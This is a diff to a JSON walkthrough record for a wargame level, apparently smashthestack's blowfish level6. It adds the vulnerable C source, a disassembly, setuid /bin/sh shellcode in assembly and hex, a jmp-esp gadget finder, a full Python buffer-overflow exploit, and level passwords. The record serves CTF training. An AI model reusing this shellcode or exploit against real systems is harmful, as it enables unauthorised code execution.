@@ -948,12 +948,61 @@
   {
    "lvl": 6,
    "user": "level6",
-   "pw": "ur_so_l33t",
+   "pw": "g00d_j0b",
    "steps": [
     {
      "cmd": "ssh -p 2222 level6@blowfish.smashthestack.org",
      "out": [
-      "level6@blowfish:~$ "
+      "level6@blowfish.smashthestack.org's password: ",
+      "",
+      "   _        __                          ___              __ ",
+      "",
+      " /\\ \\     /\\_ \\                       /'___\\ __         /\\ \\        ",
+      "",
+      " \\ \\ \\____\\//\\ \\     ___   __  __  __/\\ \\__//\\_\\    ____\\ \\ \\___    ",
+      "",
+      "  \\ \\ '__`\\ \\ \\ \\   / __`\\/\\ \\/\\ \\/\\ \\ \\  __\\/\\ \\  /' __\\\\ \\  _ `\\  ",
+      "",
+      "   \\ \\ \\_\\ \\ \\_\\ \\_/\\ \\_\\_\\ \\ \\_/ \\_/ \\ \\ \\_/\\ \\ \\/\\__  `\\\\ \\ \\ \\ \\ ",
+      "",
+      "    \\ \\____/ /\\____\\ \\____/\\ \\___x___/'\\ \\_\\  \\ \\_\\/\\____/ \\ \\_\\ \\_\\",
+      "",
+      "     \\/___/  \\/____/\\/___/  \\/__//__/   \\/_/   \\/_/\\/___/   \\/_/\\/_/",
+      "",
+      "     wargame ++ smashthestack.org ++ now in version 2.0",
+      "",
+      "   ",
+      "",
+      "     1. Thou shalt NOT root or otherwise harm the box.",
+      "",
+      "     2. Thou shalt NOT do any network access from this box.",
+      "",
+      "     3. Thou shalt NOT use /tmp, /levels/tmp or /var/tmp for personal code. ",
+      "",
+      "     4. Thou shalt give the root pass to l3thal if you manage to change it.",
+      "",
+      "     ",
+      "",
+      "     Passwords are in /pass.",
+      "",
+      "     There is a README in each users home directory.",
+      "",
+      "     /tmp && /var/tmp will be flushed daily by cron.",
+      "",
+      "     Use /code plz for umm, code ;D",
+      "",
+      "     IF YOU LEAVE FILES IN /levels/tmp U SUCK ..plz remove them kthnx! ;D",
+      "",
+      "     The password for the last level will get you into",
+      "",
+      "     Tux, the more advanced wargame. Join #blowfish on ",
+      "",
+      "     irc.smashthestack.org with any questions. ",
+      "",
+      "",
+      "",
+      "     Admin - s0ttle@smashthestack.org",
+      ""
      ]
     },
     {
@@ -972,18 +1021,104 @@
     {
      "cmd": "cat /levels/level6.c",
      "out": [
-      "snprintf(buffer1,sizeof(buffer1),\"%s\",string1);",
-      "if(strlen(string2)>=sizeof(buffer2)*3) { overflow detected }",
-      "snprintf(buffer2,sizeof(buffer1)*3,\"%s\",string2);",
-      "badfunc(argv[2], argv[1]);"
+      "#include <stdio.h>",
+      "#include <string.h>",
+      "int badfunc(char *string1, char *string2) {",
+      "  char  buffer1[1024];",
+      "  char  buffer2[1024];",
+      "  if(strlen(string1)>=sizeof(buffer1)) {",
+      "    printf(\"\\n\\t(!) overflow detected.\\n\");",
+      "    printf(\"\\t(-) exiting...\\n\\n\");",
+      "    return -1;",
+      "  }",
+      "  else {",
+      "    printf(\"\\n\\t(+) copying string1 into the buffer...\");",
+      "    snprintf(buffer1,sizeof(buffer1),\"%s\",string1);",
+      "    printf(\"\\t\\t[done] (%d)\\n\", strlen(buffer1));",
+      "  }",
+      "  if(strlen(string2)>=sizeof(buffer2)*3) {",
+      "    printf(\"\\n\\t(!) overflow detected.\\n\");",
+      "    printf(\"\\t(-) exiting...\\n\\n\");",
+      "    return -1;",
+      "  }",
+      "  else {",
+      "    printf(\"\\t(+) copying string2 into the buffer...\");",
+      "    snprintf(buffer2,sizeof(buffer1)*3,\"%s\",string2);",
+      "    printf(\"\\t\\t[done] (%d)\\n\\n\", strlen(buffer2));",
+      "  }",
+      "  return 0;",
+      "}",
+      "int main(int argc, char *argv[]) {",
+      "  if(argc != 3)",
+      "    return -1;",
+      "  badfunc(argv[2], argv[1]);",
+      "  return 0;",
+      "}"
      ]
     },
     {
      "cmd": "objdump -d --no-show-raw-insn /levels/level6 | sed -n '/<badfunc>:/,/ret/p'",
      "out": [
-      "buffer1 = ebp-0x408 (snprintf 0x400 from 0x8(%ebp) = argv[2])",
-      "buffer2 = ebp-0x808 (snprintf 0xc00 from 0xc(%ebp) = argv[1])",
-      "ret = buffer2+2060"
+      "080483f4 <badfunc>:",
+      " 80483f4:\tpush   %ebp",
+      " 80483f5:\tmov    %esp,%ebp",
+      " 80483f7:\tsub    $0x828,%esp",
+      " 80483fd:\tmov    0x8(%ebp),%eax",
+      " 8048400:\tmov    %eax,(%esp)",
+      " 8048403:\tcall   80482e8 <strlen@plt>",
+      " 8048408:\tcmp    $0x3ff,%eax",
+      " 804840d:\tjbe    8048436 <badfunc+0x42>",
+      " 804840f:\tmovl   $0x80486a0,(%esp)",
+      " 8048416:\tcall   8048308 <printf@plt>",
+      " 804841b:\tmovl   $0x80486ba,(%esp)",
+      " 8048422:\tcall   8048308 <printf@plt>",
+      " 8048427:\tmovl   $0xffffffff,-0x80c(%ebp)",
+      " 8048431:\tjmp    8048514 <badfunc+0x120>",
+      " 8048436:\tmovl   $0x80486e0,(%esp)",
+      " 804843d:\tcall   8048308 <printf@plt>",
+      " 8048442:\tmov    0x8(%ebp),%eax",
+      " 8048445:\tmov    %eax,0xc(%esp)",
+      " 8048449:\tmovl   $0x8048709,0x8(%esp)",
+      " 8048451:\tmovl   $0x400,0x4(%esp)",
+      " 8048459:\tlea    -0x408(%ebp),%eax",
+      " 804845f:\tmov    %eax,(%esp)",
+      " 8048462:\tcall   8048318 <snprintf@plt>",
+      " 8048467:\tlea    -0x408(%ebp),%eax",
+      " 804846d:\tmov    %eax,(%esp)",
+      " 8048470:\tcall   80482e8 <strlen@plt>",
+      " 8048475:\tmov    %eax,0x4(%esp)",
+      " 8048479:\tmovl   $0x804870c,(%esp)",
+      " 8048480:\tcall   8048308 <printf@plt>",
+      " 8048485:\tmov    0xc(%ebp),%eax",
+      " 8048488:\tmov    %eax,(%esp)",
+      " 804848b:\tcall   80482e8 <strlen@plt>",
+      " 8048490:\tcmp    $0xbff,%eax",
+      " 8048495:\tjbe    80484bb <badfunc+0xc7>",
+      " 8048497:\tmovl   $0x80486a0,(%esp)",
+      " 804849e:\tcall   8048308 <printf@plt>",
+      " 80484a3:\tmovl   $0x80486ba,(%esp)",
+      " 80484aa:\tcall   8048308 <printf@plt>",
+      " 80484af:\tmovl   $0xffffffff,-0x80c(%ebp)",
+      " 80484b9:\tjmp    8048514 <badfunc+0x120>",
+      " 80484bb:\tmovl   $0x8048720,(%esp)",
+      " 80484c2:\tcall   8048308 <printf@plt>",
+      " 80484c7:\tmov    0xc(%ebp),%eax",
+      " 80484ca:\tmov    %eax,0xc(%esp)",
+      " 80484ce:\tmovl   $0x8048709,0x8(%esp)",
+      " 80484d6:\tmovl   $0xc00,0x4(%esp)",
+      " 80484de:\tlea    -0x808(%ebp),%eax",
+      " 80484e4:\tmov    %eax,(%esp)",
+      " 80484e7:\tcall   8048318 <snprintf@plt>",
+      " 80484ec:\tlea    -0x808(%ebp),%eax",
+      " 80484f2:\tmov    %eax,(%esp)",
+      " 80484f5:\tcall   80482e8 <strlen@plt>",
+      " 80484fa:\tmov    %eax,0x4(%esp)",
+      " 80484fe:\tmovl   $0x8048748,(%esp)",
+      " 8048505:\tcall   8048308 <printf@plt>",
+      " 804850a:\tmovl   $0x0,-0x80c(%ebp)",
+      " 8048514:\tmov    -0x80c(%ebp),%eax",
+      " 804851a:\tleave  ",
+      " 804851b:\tret    "
      ]
     },
     {
@@ -995,42 +1130,154 @@
     {
      "cmd": "ldd /levels/level6 | head -3",
      "out": [
-      "libc.so.6 => /lib/libc.so.6 (0xb7e9d000)",
-      "(ASLR off -> fixed libc base)"
+      "\tlinux-gate.so.1 =>  (0xb7fe3000)",
+      "\t/lib/snoopy.so (0xb7fde000)",
+      "\tlibc.so.6 => /lib/libc.so.6 (0xb7e9d000)"
      ]
     },
     {
-     "cmd": "vi /dev/shm/l6bf.asm",
+     "cmd": "vim /dev/shm/l6bf.asm",
+     "out": []
+    },
+    {
+     "cmd": "vim /dev/shm/l6bf.asm",
      "out": [
-      "(55-byte NUL-free setuid shellcode)",
-      "[New] written"
+      "1 BITS 32",
+      "2 global _start",
+      "3 _start:",
+      "4     xor eax, eax",
+      "5     mov al, 201",
+      "6     int 0x80",
+      "7     mov ebx, eax",
+      "8     mov ecx, eax",
+      "9     xor eax, eax",
+      "10     mov al, 70",
+      "11     int 0x80",
+      "12     xor eax, eax",
+      "13     mov al, 201",
+      "14     int 0x80",
+      "15     mov ebx, eax",
+      "16     xor eax, eax",
+      "17     mov al, 23",
+      "18     int 0x80",
+      "19     xor eax, eax",
+      "20     push eax",
+      "21     push 0x68732f2f",
+      "22     push 0x6e69622f",
+      "23     mov ebx, esp",
+      "24     push eax",
+      "25     push ebx",
+      "26     mov ecx, esp",
+      "27     xor edx, edx",
+      "28     mov al, 11",
+      "29     int 0x80"
      ]
     },
     {
-     "cmd": "nasm -f elf32 /dev/shm/l6bf.asm -o /dev/shm/l6bf.o && objcopy -O binary --only-section=.text /dev/shm/l6bf.o /dev/shm/l6bf.bin && xxd -p /dev/shm/l6bf.bin && wc -c /dev/shm/l6bf.bin",
+     "cmd": "vim /dev/shm/l6bf.asm",
      "out": [
-      "31c0b0c9cd8089c3...bcd80",
+      "\"/dev/shm/l6bf.asm\" [New] 30L, 439C written"
+     ]
+    },
+    {
+     "cmd": "nasm -f elf32 /dev/shm/l6bf.asm -o /dev/shm/l6bf.o",
+     "out": []
+    },
+    {
+     "cmd": "objcopy -O binary --only-section=.text /dev/shm/l6bf.o /dev/shm/l6bf.bin",
+     "out": []
+    },
+    {
+     "cmd": "xxd -p /dev/shm/l6bf.bin",
+     "out": [
+      "31c0b0c9cd8089c389c131c0b046cd8031c0b0c9cd8089c331c0b017cd80",
+      "31c050682f2f7368682f62696e89e3505389e131d2b00bcd80"
+     ]
+    },
+    {
+     "cmd": "wc -c /dev/shm/l6bf.bin",
+     "out": [
       "55 /dev/shm/l6bf.bin"
      ]
     },
     {
-     "cmd": "vi /dev/shm/findjmp.py",
+     "cmd": "vim /dev/shm/findjmp.py",
+     "out": []
+    },
+    {
+     "cmd": "vim /dev/shm/findjmp.py",
      "out": [
-      "(scan libc-2.7.so for \\xff\\xe4 jmp esp; base 0xb7e9d000)",
-      "[New] written"
+      "1 data = open(\"/lib/libc-2.7.so\", \"rb\").read()",
+      "2 # ASLR is off, so libc's text base is fixed (0xb7e9d000 per /proc/self/maps).",
+      "3 # A \"jmp esp\" (ff e4) gadget turns the ret into a pivot: esp lands right after the",
+      "4 # return slot, i.e. at the start of the sled that follows it in the payload - no",
+      "5 # stack-address guessing needed.",
+      "6 base = 0xb7e9d000",
+      "7 i = data.find(\"\\xff\\xe4\")",
+      "8 print \"first jmp esp at\", hex(base + i)"
+     ]
+    },
+    {
+     "cmd": "vim /dev/shm/findjmp.py",
+     "out": [
+      "\"/dev/shm/findjmp.py\" [New] 9L, 405C written"
      ]
     },
     {
      "cmd": "python /dev/shm/findjmp.py",
      "out": [
-      "first jmp esp at 0xb7e9f991"
+      "first jmp esp at 0xb7e9f991L"
      ]
     },
     {
-     "cmd": "vi /dev/shm/e_bf6.py",
+     "cmd": "vim /dev/shm/e_bf6.py",
+     "out": []
+    },
+    {
+     "cmd": "vim /dev/shm/e_bf6.py",
      "out": [
-      "(argv[1] = A*2060 + jmp_esp + sled + shellcode; pipe-fed id + cat /pass/level7)",
-      "[New] 37L, 1132C written"
+      "1 import struct, os, time, sys, select",
+      "2 sc = open(\"/dev/shm/l6bf.bin\", \"rb\").read()",
+      "3 JMP_ESP = 0xb7e9f991",
+      "4 # level6: main -> badfunc(argv[2], argv[1]). badfunc's first param (0x8(%ebp)) =",
+      "5 # argv[2] must be strlen < 0x400; second (0xc(%ebp)) = argv[1] may be < 0xbff and is",
+      "6 # snprintf'd with size 0xc00 into buffer2 at ebp-0x808 -> ret at buffer2+2060.",
+      "7 # argv[1] = 2060 A's + jmp-esp + NOP sled + shellcode: on return, eip hits the libc",
+      "8 # jmp esp, esp points into the sled, execution slides into the shellcode.",
+      "9 payload = \"A\" * 2060 + struct.pack(\"<I\", JMP_ESP) + \"\\x90\" * 900 + sc",
+      "10 r, w = os.pipe()",
+      "11 r2, w2 = os.pipe()",
+      "12 pid = os.fork()",
+      "13 if pid == 0:",
+      "14     os.close(r)",
+      "15     os.close(w2)",
+      "16     os.dup2(r2, 0)",
+      "17     os.dup2(w, 1)",
+      "18     os.execve(\"/levels/level6\", [\"/levels/level6\", payload, \"AAAA\"], {})",
+      "19 os.close(w)",
+      "20 os.close(r2)",
+      "21 time.sleep(2)",
+      "22 os.write(w2, \"id\\ncat /pass/level7\\n\\n\")",
+      "23 out = \"\"",
+      "24 deadline = time.time() + 5",
+      "25 while time.time() < deadline:",
+      "26     rr, _, _ = select.select([r], [], [], 0.2)",
+      "27     if not rr:",
+      "28         continue",
+      "29     try:",
+      "30         d = os.read(r, 4096)",
+      "31     except OSError:",
+      "32         break",
+      "33     if not d:",
+      "34         break",
+      "35     out += d",
+      "36 print out"
+     ]
+    },
+    {
+     "cmd": "vim /dev/shm/e_bf6.py",
+     "out": [
+      "\"/dev/shm/e_bf6.py\" 37L, 1132C written"
      ]
     },
     {
@@ -1038,6 +1285,15 @@
      "out": [
       "uid=1007(level7) gid=1006(level6) groups=1006(level6)",
       "g00d_j0b"
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": [
+      "logout",
+      "Connection to blowfish.smashthestack.org closed.",
+      "client$ exit",
+      "exit"
      ]
     }
    ],
